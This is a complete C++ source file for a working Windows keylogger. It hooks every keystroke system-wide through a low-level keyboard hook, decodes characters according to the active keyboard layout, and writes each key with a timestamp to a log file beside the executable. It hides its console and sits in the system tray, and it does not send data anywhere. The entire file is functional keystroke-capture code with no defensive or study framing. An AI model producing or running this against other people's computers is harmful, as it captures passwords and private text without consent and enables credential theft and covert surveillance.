#include <windows.h>
#include <fstream>
#include <ctime>
#include <string>
#include <iostream>

#define WM_TRAYICON (WM_USER + 1)

HHOOK g_hook = NULL;
std::ofstream g_logFile;
NOTIFYICONDATA nid = {};
const wchar_t CLASS_NAME[] = L"keyLogger";

std::wstring GetLogPath() {
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    wchar_t* lastSlash = wcsrchr(exePath, L'\\');
    if (lastSlash) *lastSlash = L'\0';
    return std::wstring(exePath) + L"\\KeyLog.txt";
}

void OpenLogFile() {
    std::wstring path = GetLogPath();
    g_logFile.open(path.c_str(), std::ios::app);
}

void openLogFile() {  // menu handler
    std::wstring path = GetLogPath();
    ShellExecuteW(nullptr, L"open", path.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
}

std::string GetTimestamp() {
    time_t now = time(0);
    struct tm tstruct;
    char buf[80];
    localtime_s(&tstruct, &now);
    strftime(buf, sizeof(buf), "%Y-%m-%d %X", &tstruct);
    return buf;
}

HKL GetCurrentKeyboardLayout() {
    HWND foregroundWnd = GetForegroundWindow();
    if (!foregroundWnd) return GetKeyboardLayout(0);
    DWORD threadId = GetWindowThreadProcessId(foregroundWnd, NULL);
    return GetKeyboardLayout(threadId);
}

std::string GetCharFromKey(DWORD vkCode, UINT scanCode) {
    BYTE keyboardState[256] = {0};
    if (!GetKeyboardState(keyboardState)) return "";

    HKL keyboardLayout = GetCurrentKeyboardLayout();
    WCHAR buffer[8] = {0};

    int result = ToUnicodeEx(vkCode, scanCode, keyboardState, buffer, 8, 0, keyboardLayout);

    if (result == -1) {  // dead key (´ ^ ~ etc.) - consume it so real typing still works
        ToUnicodeEx(vkCode, scanCode, keyboardState, buffer, 8, 0, keyboardLayout);
        return "";
    }

    if (result > 0) {
        char utf8[32] = {0};
        WideCharToMultiByte(CP_UTF8, 0, buffer, result, utf8, sizeof(utf8)-1, nullptr, nullptr);
        return std::string(utf8);
    }
    return "";
}

std::string GetKeyName(DWORD vkCode, UINT scanCode) {
    switch (vkCode) {
        case VK_SHIFT:    return "[SHIFT]";
        case VK_LSHIFT:   return "[LSHIFT]";
        case VK_RSHIFT:   return "[RSHIFT]";
        case VK_CONTROL:  return "[CTRL]";
        case VK_LCONTROL: return "[LCTRL]";
        case VK_RCONTROL: return "[RCTRL]";
        case VK_MENU:     return "[ALT]";
        case VK_LMENU:    return "[LALT]";
        case VK_RMENU:    return "[RALT]";
        case VK_ESCAPE:   return "[ESC]";
        case VK_RETURN:   return "[ENTER]";
        case VK_SPACE:    return "[SPACE]";
        case VK_BACK:     return "[BACKSPACE]";
        case VK_TAB:      return "[TAB]";
        case VK_CAPITAL:  return "[CAPSLOCK]";
        case VK_LEFT:     return "[LEFT]";
        case VK_RIGHT:    return "[RIGHT]";
        case VK_UP:       return "[UP]";
        case VK_DOWN:     return "[DOWN]";
        case VK_PRIOR:    return "[PGUP]";
        case VK_NEXT:     return "[PGDN]";
        case VK_HOME:     return "[HOME]";
        case VK_END:      return "[END]";
        case VK_INSERT:   return "[INS]";
        case VK_DELETE:   return "[DEL]";
        case VK_NUMLOCK:  return "[NUMLOCK]";
        case VK_SNAPSHOT: return "[PRTSC]";
        case VK_SCROLL:   return "[SCROLL]";
        case VK_PAUSE:    return "[PAUSE]";
        case VK_LWIN:     return "[LWIN]";
        case VK_RWIN:     return "[RWIN]";
        // Add more if you want (numpad etc.)
        default: break;
    }

    std::string ch = GetCharFromKey(vkCode, scanCode);
    if (!ch.empty()) return ch;
    return "[Unknown]";
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        std::string keyName = GetKeyName(pKey->vkCode, pKey->scanCode);

        g_logFile << "[" << GetTimestamp() << "] " << keyName << std::endl;  // endl = flush
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

void SetHook() {
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
}

void ReleaseHook() {
    if (g_hook) {
        UnhookWindowsHookEx(g_hook);
        g_hook = NULL;
    }
}

LRESULT CALLBACK HiddenWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_TRAYICON:
            if (LOWORD(lParam) == WM_RBUTTONUP) {
                POINT pt;
                GetCursorPos(&pt);
                SetForegroundWindow(hwnd);

                HMENU hMenu = CreatePopupMenu();
                AppendMenu(hMenu, MF_STRING, 1, L"Show log file");
                AppendMenu(hMenu, MF_SEPARATOR, 0, nullptr);
                AppendMenu(hMenu, MF_STRING, 2, L"Exit");

                TrackPopupMenu(hMenu, TPM_BOTTOMALIGN | TPM_LEFTALIGN, pt.x, pt.y, 0, hwnd, nullptr);
                DestroyMenu(hMenu);
            }
            break;

        case WM_COMMAND:
            if (LOWORD(wParam) == 1) openLogFile();
            else if (LOWORD(wParam) == 2) PostQuitMessage(0);
            break;

        case WM_DESTROY:
            Shell_NotifyIcon(NIM_DELETE, &nid);
            ReleaseHook();
            PostQuitMessage(0);
            break;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

void InitTray(HINSTANCE hInstance) {
    WNDCLASS wc = {};
    wc.lpfnWndProc = HiddenWndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(0, CLASS_NAME, L"HiddenWindow", WS_OVERLAPPEDWINDOW,
                               0, 0, 0, 0, nullptr, nullptr, hInstance, nullptr);

    nid.cbSize = sizeof(nid);
    nid.hWnd = hwnd;
    nid.uID = 1001;
    nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;
    nid.uCallbackMessage = WM_TRAYICON;
    nid.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
    wcscpy_s(nid.szTip, L"Key Logger");

    Shell_NotifyIcon(NIM_ADD, &nid);
}

void HideConsole() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}

int main() {
    HideConsole();
    OpenLogFile();          // now always next to exe
    SetHook();
    HINSTANCE hInstance = GetModuleHandle(nullptr);
    InitTray(hInstance);

    // Single clean message loop
    MSG msg = {};
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    ReleaseHook();
    if (g_logFile.is_open()) g_logFile.close();
    return 0;
}
